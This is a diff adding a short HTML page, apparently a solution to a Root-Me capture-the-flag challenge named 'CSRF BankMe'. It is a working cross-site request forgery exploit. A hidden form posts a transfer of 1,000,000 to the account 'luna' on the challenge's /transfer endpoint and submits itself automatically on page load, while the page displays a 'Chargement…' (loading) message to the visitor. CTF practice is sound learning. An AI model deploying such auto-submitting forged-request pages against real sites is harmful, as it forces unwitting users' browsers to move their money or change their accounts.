@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF BankMe</title>
+</head>
+<body>
+    <h1>Chargement…</h1>
+    <p>Veuillez patienter…</p>
+
+    <form id="csrfForm"
+          action="https://instance-019aa1c8-60cd-729a-a245-4a7087f31c1e.challenges.root-me.pro/transfer
+"
+          method="post">
+
+        <!-- TON COMPTE -->
+        <input type="hidden" name="recipient" value="luna">
+
+        <!-- MONTANT -->
+        <input type="hidden" name="amount" value="1000000">
+    </form>
+
+    <script>
+        // Soumission automatique
+        window.onload = function () {
+            document.getElementById("csrfForm").submit();
+        };
+    </script>
+
+</body>
+</html>
